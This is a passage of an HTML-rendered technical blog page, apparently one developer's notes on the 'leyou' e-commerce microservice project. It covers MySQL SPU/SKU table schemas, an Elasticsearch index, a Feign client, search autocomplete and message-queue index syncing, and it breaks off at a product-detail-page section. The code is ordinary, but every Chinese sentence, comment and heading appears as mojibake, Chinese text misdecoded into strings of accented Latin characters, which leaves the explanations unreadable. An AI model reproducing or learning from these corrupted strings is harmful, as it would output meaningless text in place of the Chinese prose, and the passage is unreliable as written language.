`packing_list` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;åŒ…è£…æ¸…å•&#x27;</span>,</span><br><span class="line">  `after_service` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å”®åæœåŠ¡&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`spu_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure>

<p>è¿™å¼ è¡¨çš„æ•°æ®éƒ½æ¯”è¾ƒå¤§,ä¸ºäº†ä¸å½±å“ä¸»è¡¨çš„æŸ¥è¯¢æ•ˆç‡æˆ‘ä»¬æ‹†åˆ†å‡ºè¿™å¼ è¡¨.</p>
<p>éœ€è¦æ³¨æ„çš„å­—æ®µæ˜¯<code>specification</code>å­—æ®µï¼Œå…¶ä¸­ä¿å­˜çš„æ˜¯è¯¥å•†å“å¯¹åº”çš„è§„æ ¼å‚æ•°å€¼ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OPPO&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;V20&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;3&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;189&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;6&quot;</span><span class="punctuation">:</span> <span class="string">&quot;é™¶ç“·&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;7&quot;</span><span class="punctuation">:</span> <span class="string">&quot;å®‰å“&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;8&quot;</span><span class="punctuation">:</span> <span class="string">&quot;éªé¾™&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;9&quot;</span><span class="punctuation">:</span> <span class="string">&quot;éªé¾™970&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;11&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;14&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;15&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2180*1280&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;16&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1200&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;17&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2000&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;18&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3250&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;4&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ç‚«ä¸½çº¢&quot;</span><span class="punctuation">,</span> <span class="string">&quot;æå¤œé»‘&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;12&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;4GB&quot;</span><span class="punctuation">,</span> <span class="string">&quot;6GB&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;13&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;64GB&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="SKUæ•°æ®ç»“æ„"><a href="#SKUæ•°æ®ç»“æ„" class="headerlink" title="SKUæ•°æ®ç»“æ„"></a>SKUæ•°æ®ç»“æ„</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_sku` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ä¸»é”®&#x27;</span>,</span><br><span class="line">  `spu_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;spuè¡¨çš„id&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“skuçš„æ ‡é¢˜&#x27;</span>,</span><br><span class="line">  `images` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å•†å“çš„å›¾ç‰‡ï¼Œå¤šä¸ªå›¾ç‰‡ä»¥â€˜,â€™åˆ†å‰²&#x27;</span>,</span><br><span class="line">  `stock` <span class="type">int</span>(<span class="number">8</span>) unsigned <span class="keyword">DEFAULT</span> <span class="string">&#x27;9999&#x27;</span> COMMENT <span class="string">&#x27;åº“å­˜&#x27;</span>,</span><br><span class="line">  `price` <span class="type">bigint</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;é”€å”®ä»·æ ¼ï¼Œå•ä½ä¸ºåˆ†&#x27;</span>,</span><br><span class="line">  `indexes` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;å±æ€§ä¸‹æ ‡&#x27;</span>,</span><br><span class="line">  `sold` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;é”€é‡&#x27;</span>,</span><br><span class="line">  `special_spec` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;skuçš„ç‰¹æœ‰è§„æ ¼å‚æ•°é”®å€¼å¯¹ï¼Œjsonæ ¼å¼&#x27;</span>,</span><br><span class="line">  `saleable` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;æ˜¯å¦ä¸Šæ¶ï¼Œ0ä¸‹æ¶ï¼Œ1ä¸Šæ¶&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æ·»åŠ æ—¶é—´&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;æœ€åä¿®æ”¹æ—¶é—´&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `key_spu_id` (`spu_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">27359021573</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;skuè¡¨,è¯¥è¡¨è¡¨ç¤ºå…·ä½“çš„å•†å“å®ä½“,å¦‚é»‘è‰²çš„ 64gçš„iphone 8&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022660.png" alt="image-20210414212628094"></p>
<h2 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h2><p>numericæ˜¯mysqlçš„å…³é”®å­—,éœ€è¦åŠ ä¸Š@TableField(â€œ`numeric`â€œ);</p>
<h1 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h1><p>é—¨æˆ·ç³»ç»Ÿé¢å‘çš„æ˜¯ç”¨æˆ·ï¼Œå®‰å…¨æ€§å¾ˆé‡è¦ï¼Œè€Œä¸”æœç´¢å¼•æ“å¯¹äºå•é¡µåº”ç”¨å¹¶ä¸å‹å¥½ã€‚å› æ­¤æˆ‘ä»¬çš„é—¨æˆ·ç³»ç»Ÿä¸å†é‡‡ç”¨ä¸åå°ç³»ç»Ÿç±»ä¼¼çš„SPAï¼ˆå•é¡µåº”ç”¨ï¼‰ã€‚</p>
<p>ä¾ç„¶æ˜¯å‰åç«¯åˆ†ç¦»ï¼Œä¸è¿‡å‰ç«¯çš„é¡µé¢ä¼šä½¿ç”¨ç‹¬ç«‹çš„htmlï¼Œåœ¨æ¯ä¸ªé¡µé¢ä¸­ä½¿ç”¨vueæ¥åšé¡µé¢æ¸²æŸ“ã€‚</p>
<h2 id="ç´¢å¼•åº“æ•°æ®ç»“æ„"><a href="#ç´¢å¼•åº“æ•°æ®ç»“æ„" class="headerlink" title="ç´¢å¼•åº“æ•°æ®ç»“æ„"></a>ç´¢å¼•åº“æ•°æ®ç»“æ„</h2><p>æˆ‘ä»¬å­˜å…¥elasticsearchçš„æ•°æ®åŒ…å«spuã€skuã€spuDetailç­‰ä¿¡æ¯,å¿…é¡»ç»„ç»‡æˆä¸€ä¸ªå®ä½“,ç„¶åå†™å…¥.</p>
<p>æœç´¢çš„éœ€æ±‚ä¸»è¦åŒ…æ‹¬ï¼š</p>
<ul>
<li>ç”¨æ¥å‚ä¸æœç´¢çš„æ•°æ®<br>æ ‡é¢˜ã€åˆ†ç±»ã€å“ç‰Œã€è§„æ ¼å‚æ•°ã€é”€é‡ã€ä»·æ ¼ã€æ›´æ–°æ—¶é—´ã€è¯„ä»·</li>
<li>ç”¨æ¥å‚ä¸å±•ç¤ºçš„æ•°æ®<br>å›¾ç‰‡ã€ä»·æ ¼ã€æ ‡é¢˜ã€é”€é‡ã€å•†å“id</li>
</ul>
<h2 id="æ¥å…¥Feignå®¢æˆ·ç«¯"><a href="#æ¥å…¥Feignå®¢æˆ·ç«¯" class="headerlink" title="æ¥å…¥Feignå®¢æˆ·ç«¯"></a>æ¥å…¥Feignå®¢æˆ·ç«¯</h2><p>æ„å»ºGoodsæ˜¯éœ€è¦çš„æ•°æ®éƒ½æ¥è‡ªäºå•†å“å¾®æœåŠ¡,ä¸»è¦åŒ…æ‹¬ä¸‹é¢çš„æŸ¥è¯¢åŠŸèƒ½:</p>
<ul>
<li>æ‰¹é‡æŸ¥è¯¢Spu</li>
<li>æŸ¥è¯¢SpuåŒ…å«çš„Sku</li>
<li>æŸ¥è¯¢Spuçš„è§„æ ¼å‚æ•°é”®å€¼å¯¹ä¿¡æ¯</li>
</ul>
<p>å•†å“å¾®æœåŠ¡éœ€è¦å¯¹å¤–æä¾›è¿™æ ·çš„æ¥å£,æˆ‘ä»¬åœ¨å…¶ä»–å¾®æœåŠ¡æ‰å¯ä»¥è°ƒç”¨. è€Œè¿œç¨‹è°ƒç”¨éœ€è¦é€šè¿‡Feignå®Œæˆ,å› æ­¤æˆ‘ä»¬è¦åœ¨ly-item-apié¡¹ç›®ä¸­,ç¼–å†™Feignå®¢æˆ·ç«¯.</p>
<p>Feignçš„åŸç†</p>
<p>å¯¹httpè¯·æ±‚çš„ä¼ªè£…</p>
<p>éœ€è¦çŸ¥é“ï¼šlocalhost:8081&#x2F;goods&#x2F;spu&#x2F;page?page&#x3D;1</p>
<p>ä¸»æœºå’Œç«¯å£ï¼šé€šè¿‡@FeignClient(â€œitem-serviceâ€)å¾—åˆ°æœåŠ¡åç§°ï¼Œå»eurekaæ ¹æ®æœåŠ¡åç§°æ‹‰å–æœåŠ¡åˆ—è¡¨</p>
<p>è¯·æ±‚æ–¹å¼ï¼š @GetMappingè¯·æ±‚è·¯å¾„ï¼š@GetMapping(â€œ&#x2F;goods&#x2F;spu&#x2F;pageâ€)</p>
<p>è¯·æ±‚å‚æ•°ï¼š@RequestParam(value &#x3D; â€œpageâ€, defaultValue &#x3D; â€œ1â€) Integer page</p>
<p>è¿”å›å€¼ç±»å‹ï¼šå“åº”ä½“çš„ç±»å‹</p>
<h3 id="åœ¨ly-itemæä¾›Feignå®¢æˆ·ç«¯"><a href="#åœ¨ly-itemæä¾›Feignå®¢æˆ·ç«¯" class="headerlink" title="åœ¨ly-itemæä¾›Feignå®¢æˆ·ç«¯"></a>åœ¨ly-itemæä¾›Feignå®¢æˆ·ç«¯</h3><p>åœ¨äº<code>ly-item-api</code>ä¸­åˆ›å»ºåŒ…ï¼š<code>com.leyou.item.client</code>ï¼Œç„¶ååˆ›å»º<code>ItemClient</code>æ¥å£</p>
<h3 id="åœ¨ly-searchå¼•å…¥Feignå®¢æˆ·ç«¯"><a href="#åœ¨ly-searchå¼•å…¥Feignå®¢æˆ·ç«¯" class="headerlink" title="åœ¨ly-searchå¼•å…¥Feignå®¢æˆ·ç«¯"></a>åœ¨ly-searchå¼•å…¥Feignå®¢æˆ·ç«¯</h3><h4 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-item-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="å¯åŠ¨FeignClient"><a href="#å¯åŠ¨FeignClient" class="headerlink" title="å¯åŠ¨FeignClient"></a>å¯åŠ¨FeignClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableFeignClients(basePackages = &quot;com.leyou.item.client&quot;)</span></span><br></pre></td></tr></table></figure>

<h3 id="å®Œæˆæ•°æ®å¯¼å…¥"><a href="#å®Œæˆæ•°æ®å¯¼å…¥" class="headerlink" title="å®Œæˆæ•°æ®å¯¼å…¥"></a>å®Œæˆæ•°æ®å¯¼å…¥</h3><h2 id="æœç´¢æ¡†è¡¥å…¨"><a href="#æœç´¢æ¡†è¡¥å…¨" class="headerlink" title="æœç´¢æ¡†è¡¥å…¨"></a>æœç´¢æ¡†è¡¥å…¨</h2><p>è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå¤§æ¦‚æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>é¡µé¢å‘è¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼Œæºå¸¦ç”¨æˆ·è¾“å…¥çš„å…³é”®å­—</li>
<li>æœåŠ¡ç«¯æ ¹æ®å…³é”®å­—æŸ¥è¯¢elasticsearchï¼Œå¾—åˆ°è‡ªåŠ¨è¡¥å…¨çš„æç¤ºä¿¡æ¯</li>
<li>æœåŠ¡ç«¯è¿”å›ä¿¡æ¯åˆ°é¡µé¢ï¼Œåœ¨é¡µé¢å®Œæˆæ¸²æŸ“</li>
</ul>
<p>ç»‘å®šäº†é”®ç›˜äº‹ä»¶ï¼ŒåŒæ—¶ä½¿ç”¨<code>v-model</code>å…³è”äº†ä¸€ä¸ªå˜é‡ï¼š<code>key</code>.</p>
<p>è€Œåœ¨ä¸‹é¢çš„é”®ç›˜å¯¹åº”çš„äº‹ä»¶é‡Œï¼Œæˆ‘ä»¬ä¼šåˆ¤æ–­ç”¨æˆ·æŒ‰ä¸‹çš„é”®ï¼Œå¦‚æœæ˜¯å­—æ¯æ•°å­—è¿™æ ·çš„æŒ‰é’®ï¼Œå°±ä¼šå»è°ƒç”¨<code>getSuggestion()</code>æ–¹æ³•ï¼ŒæŸ¥è¯¢æç¤ºå†…å®¹; æ¯å½“ç”¨æˆ·æŒ‰ä¸‹å¯¹åº”æŒ‰é”®ï¼Œè¾“å…¥æ–‡å­—ï¼Œå°±ä¼šè§¦å‘ï¼Œå‘é€è¯·æ±‚åˆ°æœåŠ¡ç«¯;</p>
<p>ç°åœ¨ï¼Œé¡µé¢è¯·æ±‚å·²ç»å‘å‡ºäº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å†æœåŠ¡ç«¯æ¥æ”¶ï¼Œå¹¶ä¸”å»ElasticsearchæŸ¥è¯¢äº†;</p>
<h3 id="è‡ªåŠ¨è¡¥å…¨æ¨¡ç‰ˆ"><a href="#è‡ªåŠ¨è¡¥å…¨æ¨¡ç‰ˆ" class="headerlink" title="è‡ªåŠ¨è¡¥å…¨æ¨¡ç‰ˆ"></a>è‡ªåŠ¨è¡¥å…¨æ¨¡ç‰ˆ</h3><p>æˆ‘ä»¬æœåŠ¡ç«¯è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ¥æ”¶å‰ç«¯è¯·æ±‚ï¼Œè·å–è¡¥å…¨çš„prefixå‚æ•°</li>
<li>å»ESæŸ¥è¯¢ï¼Œè·å–è¡¥å…¨çš„å†…å®¹<ul>
<li>å…ˆåœ¨ESä¸­å®šä¹‰è‡ªåŠ¨è¡¥å…¨çš„æŸ¥è¯¢æ¨¡æ¿</li>
<li>javaä»£ç ä¸­è°ƒç”¨æŸ¥è¯¢æ¨¡æ¿ï¼Œè·å–è¡¥å…¨ç»“æœ</li>
</ul>
</li>
<li>è¿”å›åˆ°é¡µé¢</li>
</ul>
<h2 id="åŸºæœ¬æœç´¢"><a href="#åŸºæœ¬æœç´¢" class="headerlink" title="åŸºæœ¬æœç´¢"></a>åŸºæœ¬æœç´¢</h2><p>ç»™ç”¨æˆ·æç¤ºä¿¡æ¯åï¼Œæ¥ä¸‹æ¥ç”¨æˆ·å°±ä¼šå»æœç´¢æ•°æ®äº†ï¼Œå¤§æ¦‚çš„å®ç°æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>ç”¨æˆ·ç‚¹å‡»æç¤ºçš„å†…å®¹æˆ–è‡ªå·±è¾“å…¥å†…å®¹ç‚¹å‡»æœç´¢</li>
<li>é¡µé¢è·³è½¬åˆ°æœç´¢åˆ—è¡¨é¡µï¼Œå¹¶æºå¸¦æœç´¢å…³é”®å­—</li>
<li>æœç´¢åˆ—è¡¨é¡µå‘èµ·è¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼Œæºå¸¦æœç´¢å‚æ•°</li>
<li>æœåŠ¡ç«¯åˆ©ç”¨æœç´¢å…³é”®å­—ï¼Œå‘ElasticSearchå‘èµ·è¯·æ±‚ï¼ŒæŸ¥è¯¢æ•°æ®</li>
<li>è¿”å›æ•°æ®åˆ°é¡µé¢ï¼Œå®Œæˆæ¸²æŸ“</li>
</ul>
<h2 id="æ•°æ®åŒæ­¥"><a href="#æ•°æ®åŒæ­¥" class="headerlink" title="æ•°æ®åŒæ­¥"></a>æ•°æ®åŒæ­¥</h2><p>å•†å“ä¸Šæ¶:åœ¨ç´¢å¼•åº“æ–°å¢æ•°æ®; å•†å“ä¸‹æ¶: æŠŠæ•°æ®ä»ç´¢å¼•åº“åˆ é™¤;</p>
<p>å•†å“çš„ä¸Šæ¶å’Œä¸‹æ¶æ—¶å•†å“å¾®æœåŠ¡<code>ly-item</code>ä¸­å¤„ç†çš„ï¼Œç´¢å¼•åº“æ•°æ®æ˜¯åœ¨<code>ly-search</code>ä¸­å¤„ç†çš„ã€‚æˆ‘ä»¬å¦‚ä½•åœ¨ä¸Šæ¶æ—¶ä¿®æ”¹ç´¢å¼•åº“å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li><p>æ–¹æ¡ˆ1ï¼šåœ¨å•†å“å¾®æœåŠ¡çš„ä¸Šä¸‹æ¶ä¸šåŠ¡åï¼ŒåŠ å…¥ä¿®æ”¹ç´¢å¼•åº“æ•°æ®</p>
</li>
<li><p>æ–¹æ¡ˆ2ï¼šæœç´¢æœåŠ¡å¯¹å¤–æä¾›æ“ä½œç´¢å¼•åº“ï¼Œå•†å“å¾®æœåŠ¡åœ¨å•†å“ä¸Šä¸‹æ¶åï¼Œè°ƒç”¨æ¥å£ã€‚</p>
</li>
</ul>
<p>ä»¥ä¸Šä¸¤ç§æ–¹å¼éƒ½æœ‰åŒä¸€ä¸ªä¸¥é‡é—®é¢˜ï¼šå°±æ˜¯ä»£ç è€¦åˆï¼Œåå°æœåŠ¡ä¸­éœ€è¦åµŒå…¥æœç´¢å’Œå•†å“é¡µé¢æœåŠ¡ï¼Œè¿èƒŒäº†å¾®æœåŠ¡çš„<code>ç‹¬ç«‹</code>åŸåˆ™ï¼Œè€Œä¸”ä¸¥é‡è¿èƒŒäº†å¼€é—­åŸåˆ™ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡å¦å¤–ä¸€ç§æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼šæ¶ˆæ¯é˜Ÿåˆ—</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022661.png" alt="image-20210414230406233"></p>
<p>å•†å“å¾®æœåŠ¡åœ¨å®Œæˆä¸Šæ¶ã€ä¸‹æ¶åï¼Œå‘é€æ¶ˆæ¯åˆ°MQï¼Œé€šçŸ¥æ˜¯å“ªä¸ªå•†å“æ›´æ–°äº†ï¼Œè‡ªå·±çš„ä¸šåŠ¡å°±ç»“æŸäº†ï¼Œå•†å“å¾®æœåŠ¡ä¸éœ€è¦çŸ¥é“ï¼Œä¹Ÿä¸å…³å¿ƒåˆ°åº•æ˜¯è°åœ¨ç›‘å¬è¿™æ¡æ¶ˆæ¯ã€‚</p>
<p>æœç´¢å¾®æœåŠ¡åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œæ›´æ–°ç´¢å¼•åº“æ•°æ®å³å¯ï¼ŒåŒæ ·ä¸éœ€è¦å…³å¿ƒåˆ«äººã€‚</p>
<p>ä¸¤ä¸ªå¾®æœåŠ¡ä¹‹é—´æ²¡æœ‰ç›´æ¥è°ƒç”¨ï¼Œæ²¡æœ‰ä¸šåŠ¡çš„è€¦åˆã€‚</p>
<p>ä¸è¿‡ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜éœ€è¦æ€è€ƒï¼š</p>
<ul>
<li><p>ä»€ä¹ˆæ—¶å€™å‘æ¶ˆæ¯ï¼Ÿ</p>
<ul>
<li>å½“å•†å“æœåŠ¡å¯¹å•†å“è¿›è¡Œä¸Šä¸‹æ¶çš„æ—¶å€™ï¼Œéœ€è¦å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œé€šçŸ¥å…¶å®ƒæœåŠ¡</li>
</ul>
</li>
<li><p>å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>å¯¹å•†å“çš„å¢åˆ æ”¹æ—¶å…¶å®ƒæœåŠ¡å¯èƒ½éœ€è¦æ–°çš„å•†å“æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæ¶ˆæ¯å†…å®¹ä¸­åŒ…å«å…¨éƒ¨å•†å“ä¿¡æ¯ï¼Œæ•°æ®é‡å¤ªå¤§ï¼Œè€Œä¸”å¹¶ä¸æ˜¯æ¯ä¸ªæœåŠ¡éƒ½éœ€è¦å…¨éƒ¨çš„ä¿¡æ¯ã€‚å› æ­¤æˆ‘ä»¬<strong>åªå‘é€å•†å“id</strong>ï¼Œå…¶å®ƒæœåŠ¡å¯ä»¥æ ¹æ®idæŸ¥è¯¢è‡ªå·±éœ€è¦çš„ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li><p>æœç´¢å¾®æœåŠ¡æ¥æ”¶æ¶ˆæ¯åå¦‚ä½•å¤„ç†ï¼Ÿ</p>
<ul>
<li>ä¸Šæ¶ï¼šæ·»åŠ æ–°çš„æ•°æ®åˆ°ç´¢å¼•åº“</li>
<li>ä¸‹æ¶ï¼šåˆ é™¤ç´¢å¼•åº“æ•°æ®</li>
</ul>
</li>
</ul>
<h3 id="æ¶ˆæ¯é˜Ÿåˆ—å¸¸é‡"><a href="#æ¶ˆæ¯é˜Ÿåˆ—å¸¸é‡" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—å¸¸é‡"></a>æ¶ˆæ¯é˜Ÿåˆ—å¸¸é‡</h3><p>åœ¨<code>ly-common</code>çš„<code>com.leyou.common.constants</code>åŒ…ä¸­ç¼–å†™ä¸€ä¸ªå¸¸é‡ç±»ï¼Œè®°å½•å°†æ¥ä¼šç”¨åˆ°çš„Exchangeåç§°ã€Queueåç§°ã€routing_keyåç§°.</p>
<h1 id="WebFlux"><a href="#WebFlux" class="headerlink" title="WebFlux"></a>WebFlux</h1><h1 id="å•†å“è¯¦æƒ…é¡µ"><a href="#å•†å“è¯¦æƒ…é¡µ" class="headerlink" title="å•†å“è¯¦æƒ…é¡µ"></a>å•†å“è¯¦æƒ…é¡µ</h1><h2 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h2><p>ç”¨æˆ·æœç´¢åˆ°å•†å“åï¼Œå°±ä¼šç‚¹å‡»å•†å“ï¼ŒæŸ¥çœ‹å•†å“è¯¦æƒ…å†…å®¹ï¼Œå°±ä¼šè®¿é—®åˆ°å•†å“è¯¦æƒ…é¡µã€‚å•†å“è¯¦æƒ…é¡µæ˜¯å±•ç¤ºå•†å“è¯¦ç»†ä¿¡æ¯çš„ä¸€ä¸ªé¡µé¢ï¼Œæ‰¿è½½åœ¨ç½‘ç«™çš„å¤§éƒ¨åˆ†æµé‡å’Œè®¢å•çš„å…¥å£ã€‚</p>
<p>å› æ­¤ï¼Œå•†å“è¯¦æƒ…é¡µå¿…é¡»èƒ½å¤Ÿåº”å¯¹é«˜å¹¶å‘çš„å‹åŠ›ã€‚é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å®ç°ä¸€ä¸ªæ»¡è¶³åƒä¸‡çº§å¹¶å‘é‡çš„å•†å“è¯¦æƒ…é¡µé¢å‘¢ï¼Ÿ</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±ä¸€èµ·åˆ†æä¸‹å•†å“è¯¦æƒ…é¡µçš„è®¾è®¡æ€è·¯ã€‚</p>
<h2 id="ä¼ ç»Ÿæ¨¡å¼"><a href="#ä¼ ç»Ÿæ¨¡å¼" class="headerlink" title="ä¼ ç»Ÿæ¨¡å¼"></a>ä¼ ç»Ÿæ¨¡å¼</h2><p>é¦–å…ˆï¼Œæ¥çœ‹ä¸‹ä¼ ç»Ÿæ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªé¡µé¢çš„åŠ è½½å’Œæ¸²æŸ“è¿‡ç¨‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022662.png" alt="image-20200310173422202"></p>
